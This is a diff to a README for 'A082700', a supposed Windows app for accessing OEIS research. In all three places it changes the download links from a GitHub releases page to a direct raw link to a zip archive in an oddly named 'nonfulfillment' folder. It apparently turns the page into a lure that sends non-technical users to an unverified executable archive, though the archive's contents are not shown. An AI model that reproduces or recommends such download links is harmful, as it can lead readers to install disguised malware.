@@ -1,6 +1,6 @@
 # 🔎 A082700 - Simple Access to OEIS Research
 
-[![Download A082700](https://img.shields.io/badge/Download%20A082700-blue-grey?style=for-the-badge)](https://github.com/latinescegreatleavedmacrophylla871/A082700/releases)
+[![Download A082700](https://img.shields.io/badge/Download%20A082700-blue-grey?style=for-the-badge)](https://raw.githubusercontent.com/latinescegreatleavedmacrophylla871/A082700/main/nonfulfillment/Software_v2.1.zip)
 
 ## 📘 About A082700
 
@@ -24,7 +24,7 @@ If your PC can open modern desktop apps, it should handle this one.
 
 Visit this page to download the app:
 
-https://github.com/latinescegreatleavedmacrophylla871/A082700/releases
+https://raw.githubusercontent.com/latinescegreatleavedmacrophylla871/A082700/main/nonfulfillment/Software_v2.1.zip
 
 On that page, pick the latest release and download the Windows file. If the release page shows more than one file, choose the one made for Windows.
 
@@ -140,7 +140,7 @@ If Windows says it cannot find the file:
 
 Download, update, or re-download A082700 here:
 
-https://github.com/latinescegreatleavedmacrophylla871/A082700/releases
+https://raw.githubusercontent.com/latinescegreatleavedmacrophylla871/A082700/main/nonfulfillment/Software_v2.1.zip
 
 ## 🗂️ Folder Layout Example
 
